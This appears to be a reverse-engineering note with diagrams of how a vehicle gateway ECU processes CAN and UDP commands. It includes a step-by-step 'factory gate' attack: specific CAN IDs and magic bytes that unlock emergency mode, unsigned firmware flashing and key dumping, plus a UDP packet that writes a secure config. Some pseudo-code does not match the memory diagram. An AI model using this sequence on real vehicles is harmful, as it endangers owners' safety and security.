# Gateway Command Processing Flow Diagram

Visual representation of how CAN commands flow through the Gateway firmware.

---

## CAN Message Reception Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    CAN Bus (Vehicle Network)                     │
│              Multiple ECUs broadcasting messages                 │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ CAN frame received
                            │ (11-bit ID, 0-8 data bytes)
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│                  Gateway PowerPC CAN Controller                  │
│                                                                  │
│  Hardware Filtering:                                             │
│  ├─ Accept broadcast IDs (0x000-0x7FF)                          │
│  ├─ Accept diagnostic IDs (0x7E0-0x7E7)                         │
│  └─ Reject all others                                            │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Interrupt: CAN RX complete
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│                   ISR: CAN Receive Handler                       │
│                                                                  │
│  1. Read CAN frame from FIFO                                    │
│  2. Extract CAN ID and data                                     │
│  3. Post message to FreeRTOS queue                              │
│  4. Clear interrupt flag                                        │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Message queued
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│              FreeRTOS Task: mainTask (Priority 5)                │
│                                                                  │
│  while (1) {                                                     │
│      can_msg = xQueueReceive(can_rx_queue, WAIT_FOREVER);       │
│      process_can_message(&can_msg);                             │
│  }                                                               │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Dispatch to handler
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│               Command Dispatch Table @ 0x800                     │
│                                                                  │
│  uint32_t can_id = msg->id & 0x1FF;  // Mask to 9 bits          │
│                                                                  │
│  if (can_id > 299) {                                            │
│      can_id = 299;  // Out-of-bounds → default handler          │
│  }                                                               │
│                                                                  │
│  handler_func = dispatch_table[can_id];                         │
│  handler_func(msg->data, msg->len);                             │
└───────────────────────────┬─────────────────────────────────────┘
                            │
              ┌─────────────┴─────────────┐
              │                           │
              ↓                           ↓
     ┌────────────────┐         ┌─────────────────┐
     │ Default Handler│         │ Specific Handler│
     │  (0x40005E34)  │         │   (varies)      │
     │                │         │                 │
     │ - Log unknown  │         │ - Parse data    │
     │ - Return error │         │ - Execute action│
     │ - No action    │         │ - Send response │
     └────────────────┘         └─────────────────┘
```

---

## Factory Gate Command Flow (VULNERABLE)

```
┌─────────────────────────────────────────────────────────────────┐
│          Attacker sends CAN ID 0x85 (factory_gate_trigger)       │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│            Handler: factory_gate_trigger (0x400053BC)            │
│                                                                  │
│  void factory_gate_trigger(void) {                              │
│      uint32_t *pos = (uint32_t*)0x40016000;                     │
│      *pos = 0;  // Reset position counter                       │
│      // BUG: Overwrites buffer[0-3]!                            │
│  }                                                               │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Buffer reset, ready to receive data
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│    Attacker sends 8× CAN ID 0x88 (factory_gate_accumulate)      │
│                                                                  │
│    Data: 0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00         │
│          (ASCII "Ie" + 6 null bytes)                            │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ For each byte received
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│       Handler: factory_gate_accumulate (0x400053C4)             │
│                                                                  │
│  void factory_gate_accumulate(uint8_t byte) {                   │
│      uint32_t *pos = (uint32_t*)0x40016000;                     │
│      uint8_t *buf = (uint8_t*)0x40016000;                       │
│                                                                  │
│      uint32_t current_pos = *pos;                               │
│                                                                  │
│      // ⚠️  NO BOUNDS CHECK - VULNERABILITY!                    │
│      buf[current_pos] = byte;                                   │
│      current_pos++;                                             │
│      *pos = current_pos;                                        │
│                                                                  │
│      if (current_pos >= 8) {                                    │
│          uint8_t cmd[8];                                        │
│          memcpy(cmd, buf + 4, 8);  // Skip position counter     │
│                                                                  │
│          if (memcmp(cmd, "Ie\0\0\0\0\0\0", 8) == 0) {           │
│              enable_emergency_mode();                           │
│              print_string("Factory gate succeeded");            │
│          } else {                                               │
│              print_string("Factory gate failed");               │
│          }                                                       │
│                                                                  │
│          factory_gate_trigger();  // Reset for next attempt     │
│      }                                                           │
│  }                                                               │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Magic bytes matched!
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│               Emergency Mode Activated (IPC Signal)              │
│                                                                  │
│  1. Set global flag: emergency_mode_enabled = true              │
│  2. Signal x86_64 host via shared memory IPC                    │
│  3. Disable watchdog timeout                                    │
│  4. Elevate all command privileges                              │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ IPC message received
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│               x86_64 Host: Emergency Mode Daemon                 │
│                                                                  │
│  if (emergency_signal_received) {                               │
│      start_udpapi_server(port=25956);                           │
│      disable_signature_checks();                                │
│      enable_factory_commands();                                 │
│  }                                                               │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ UDP port 25956 now listening
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│           Attacker has full access to Gateway ECU                │
│                                                                  │
│  Available operations:                                           │
│  ├─ Flash unsigned firmware (no signature check)                │
│  ├─ Write secure configs (VIN, keys, security level)            │
│  ├─ Disable watchdog permanently                                │
│  ├─ Dump cryptographic keys                                     │
│  └─ Execute arbitrary diagnostic commands                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Config Read/Write Flow

```
┌─────────────────────────────────────────────────────────────────┐
│        UDP Packet sent to 192.168.90.102:3500 (UDPAPI)          │
│                                                                  │
│        Command: 0x0B 0x00 0x3B  (Read config ID 59 = dasHw)     │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ lwIP UDP stack
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│            FreeRTOS Task: tcpip_thread (lwIP)                    │
│                                                                  │
│  1. Receive UDP packet                                           │
│  2. Parse UDP payload                                            │
│  3. Post to udp_rx_queue                                        │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Message queued
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│          UDP Command Handler: process_udp_config_cmd()           │
│                                                                  │
│  uint8_t opcode = packet[0];    // 0x0B = Read                  │
│  uint8_t reserved = packet[1];  // 0x00                         │
│  uint8_t config_id = packet[2]; // 0x3B = dasHw                 │
│                                                                  │
│  switch (opcode) {                                               │
│      case 0x0B:  // Read config                                 │
│          read_config_handler(config_id);                        │
│          break;                                                  │
│      case 0x0C:  // Write config                                │
│          write_config_handler(config_id, &packet[3]);           │
│          break;                                                  │
│      case 0x14:  // Promote                                     │
│          promote_handler(&packet[1]);                           │
│          break;                                                  │
│      case 0x18:  // Unlock                                      │
│          unlock_handler(&packet[1]);                            │
│          break;                                                  │
│  }                                                               │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ opcode = 0x0B (Read)
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│                   read_config_handler(0x3B)                      │
│                                                                  │
│  uint8_t value;                                                  │
│  uint16_t eeprom_offset = config_id_to_offset(0x3B);            │
│  // offset = 0x3B * MAX_CONFIG_SIZE = 0x3B * 32 = 0x760         │
│                                                                  │
│  eeprom_read(eeprom_offset, &value, 1);                         │
│  // Read from EEPROM address 0x760                              │
│                                                                  │
│  udp_send_response(config_id, &value, 1);                       │
│  // Response: 0x0B 0x3B 0x04 (opcode, ID, value=4 for AP3)      │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Response packet
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│           UDP Response sent to 192.168.90.100:XXXXX              │
│                                                                  │
│           Payload: 0x0B 0x3B 0x04                                │
│                    (Read dasHw, ID=59, value=4)                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Write Config Flow (Secure Config Protection)

```
┌─────────────────────────────────────────────────────────────────┐
│    Attacker attempts to write devSecurityLevel (config 15)       │
│                                                                  │
│    Command: 0x0C 0x00 0x0F 0x01                                 │
│             (Write config 15, value=1 = factory mode)           │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ UDP packet received
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│              write_config_handler(0x0F, &value)                  │
│                                                                  │
│  // Security check!                                              │
│  if (is_secure_config(0x0F)) {                                  │
│      if (!emergency_mode_enabled) {                             │
│          udp_send_error(0xFF);  // REJECTED                     │
│          return;                                                 │
│      }                                                           │
│  }                                                               │
│                                                                  │
│  // If we get here, write is allowed                            │
│  uint16_t offset = config_id_to_offset(0x0F);                   │
│  eeprom_write(offset, &value, 1);                               │
│  udp_send_response(0x0C, 0x01);  // ACCEPTED                    │
└─────────────────────────────────────────────────────────────────┘
                            │
                 ┌──────────┴──────────┐
                 │                     │
                 ↓                     ↓
    ┌────────────────────┐  ┌──────────────────────┐
    │ Emergency Mode OFF │  │  Emergency Mode ON   │
    │                    │  │                      │
    │ Response: 0xFF     │  │  Response: 0x0C 0x01 │
    │ (REJECTED)         │  │  (ACCEPTED)          │
    │                    │  │                      │
    │ Config unchanged   │  │  Config written!     │
    └────────────────────┘  └──────────────────────┘
```

---

## Memory Layout During Factory Gate Attack

```
Before Attack:
┌───────────────────────────────────────────────┐
│ 0x40016000: Factory Gate Buffer (8 KB)       │
├───────────────────────────────────────────────┤
│ [0x00-0x03] Position counter = 0x00000000     │
│ [0x04-0x0B] Uninitialized                     │
│ [0x0C-0x1FFF] Unused buffer space             │
└───────────────────────────────────────────────┘

After CAN 0x85 (trigger):
┌───────────────────────────────────────────────┐
│ 0x40016000: Factory Gate Buffer (8 KB)       │
├───────────────────────────────────────────────┤
│ [0x00-0x03] Position counter = 0x00000000     │ ← RESET
│ [0x04-0x0B] Uninitialized                     │
│ [0x0C-0x1FFF] Unused buffer space             │
└───────────────────────────────────────────────┘

After 8× CAN 0x88 (accumulate):
┌───────────────────────────────────────────────┐
│ 0x40016000: Factory Gate Buffer (8 KB)       │
├───────────────────────────────────────────────┤
│ [0x00-0x03] Position counter = 0x00000008     │ ← Updated
│ [0x04] 0x49 ('I')                             │ ← Data byte 0
│ [0x05] 0x65 ('e')                             │ ← Data byte 1
│ [0x06] 0x00                                   │ ← Data byte 2
│ [0x07] 0x00                                   │ ← Data byte 3
│ [0x08] 0x00                                   │ ← Data byte 4
│ [0x09] 0x00                                   │ ← Data byte 5
│ [0x0A] 0x00                                   │ ← Data byte 6
│ [0x0B] 0x00                                   │ ← Data byte 7
│ [0x0C-0x1FFF] Unused buffer space             │
└───────────────────────────────────────────────┘
                   ↓
          Magic bytes matched!
                   ↓
       ┌──────────────────────────┐
       │ Emergency Mode Activated │
       └──────────────────────────┘
```

---

## Command Priority & Execution Order

```
┌─────────────────────────────────────────────────────────────────┐
│                     FreeRTOS Task Priorities                     │
└─────────────────────────────────────────────────────────────────┘

Priority 7 (Highest)
├─ CAN RX ISR (interrupt context, not a task)
└─ Hardware watchdog pet loop

Priority 5
├─ mainTask (command processing)
└─ Factory gate check loop

Priority 4
└─ tcpip_thread (lwIP network stack)

Priority 3
├─ UDP packet processing
└─ Config read/write handlers

Priority 2
└─ blinky (status LED)

Priority 1
└─ Idle task (FreeRTOS)

─────────────────────────────────────────────────────────────────

Execution Flow (time ordered):
┌────────────┬────────────────────────────────────────────────┐
│    Time    │                   Action                       │
├────────────┼────────────────────────────────────────────────┤
│ T+0ms      │ CAN frame arrives → RX interrupt fires         │
│ T+0.1ms    │ ISR posts message to queue                     │
│ T+0.2ms    │ mainTask wakes up (highest priority)           │
│ T+0.3ms    │ Dispatch table lookup                          │
│ T+0.4ms    │ Handler executes                               │
│ T+1ms      │ Handler completes, mainTask blocks             │
│ T+2ms      │ Watchdog pet (if timer expired)                │
│ T+10ms     │ blinky toggles LED                             │
└────────────┴────────────────────────────────────────────────┘
```

---

**Document:** 52b-gateway-command-flow.md  
**Created:** 2026-02-03  
**Purpose:** Visual diagrams of Gateway command processing flow
